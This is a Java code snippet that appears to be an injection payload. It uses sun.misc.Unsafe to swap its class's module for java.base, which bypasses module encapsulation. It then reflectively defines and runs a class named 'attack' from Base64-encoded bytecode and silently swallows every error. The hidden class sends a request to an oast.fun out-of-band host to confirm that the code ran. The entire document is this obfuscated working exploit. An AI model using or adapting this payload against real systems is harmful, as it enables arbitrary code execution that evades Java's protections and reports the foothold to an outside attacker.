import sun.misc.Unsafe; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.Base64; public class UnsafeTest { public static void test() { try { String payload = "yv66vgAAAEIATQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAMamF2YS9uZXQvVVJMCAAKAQAyaHR0cHM6Ly9xd25zbHRwdHZib29kdHRyaXZpeXUwb2NneG1wMHoyMjgub2FzdC5mdW4KAAcADAwABQANAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCgAHAA8MABAAEQEADm9wZW5Db25uZWN0aW9uAQAaKClMamF2YS9uZXQvVVJMQ29ubmVjdGlvbjsHABMBABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbggAFQEAA0dFVAoAEgAXDAAYAA0BABBzZXRSZXF1ZXN0TWV0aG9kCgASABoMABsAHAEAD2dldFJlc3BvbnNlQ29kZQEAAygpSQkAHgAfBwAgDAAhACIBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07CgAkACUHACYMACcAKAEAEGphdmEvbGFuZy9TdHJpbmcBAAd2YWx1ZU9mAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsSAAAAKgwAKwAsAQAXbWFrZUNvbmNhdFdpdGhDb25zdGFudHMBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsKAC4ALwcAMAwAMQANAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4HADMBABNqYXZhL2xhbmcvRXhjZXB0aW9uCgAyADUMADYABgEAD3ByaW50U3RhY2tUcmFjZQcAOAEAB1BpbmdVUkwBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAxQaW5nVVJMLmphdmEBABBCb290c3RyYXBNZXRob2RzCABAAQAgUGluZ2VkIFVSTDogASB8IFJlc3BvbnNlIENvZGU6IAEPBgBCCgBDAEQHAEUMACsARgEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7AQAMSW5uZXJDbGFzc2VzBwBJAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAcASwEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwEABkxvb2t1cAAhADcAAgAAAAAAAQABAAUABgABADkAAACUAAMABAAAADoqtwABuwAHWRIJtwALTCu2AA7AABJNLBIUtgAWLLYAGT6yAB0ruAAjHboAKQAAtgAtpwAITCu2ADSxAAEABAAxADQAMgACADoAAAAqAAoAAAAFAAQACAAOAAkAFgAKABwADQAhAA4AMQARADQADwA1ABAAOQASADsAAAAQAAL/ADQAAQcANwABBwAyBAADADwAAAACAD0APgAAAAgAAQBBAAEAPwBHAAAACgABAEgASgBMABk="; Class&lt;?&gt; unSafe=Class.forName("sun.misc.Unsafe"); Field unSafeField=unSafe.getDeclaredField("theUnsafe"); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); Module baseModule=Object.class.getModule(); Class&lt;?&gt; currentClass= UnsafeTest.class; long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module")); unSafeClass.getAndSetObject(currentClass,addr,baseModule); Class&lt;?&gt; byteArrayClass = Class.forName("[B"); Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byteArrayClass, int.class, int.class); defineClass.setAccessible(true); Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", Base64.getDecoder().decode(payload), 0, Base64.getDecoder().decode(payload).length); calc.newInstance(); }catch (Exception e){} } } UnsafeTest.test();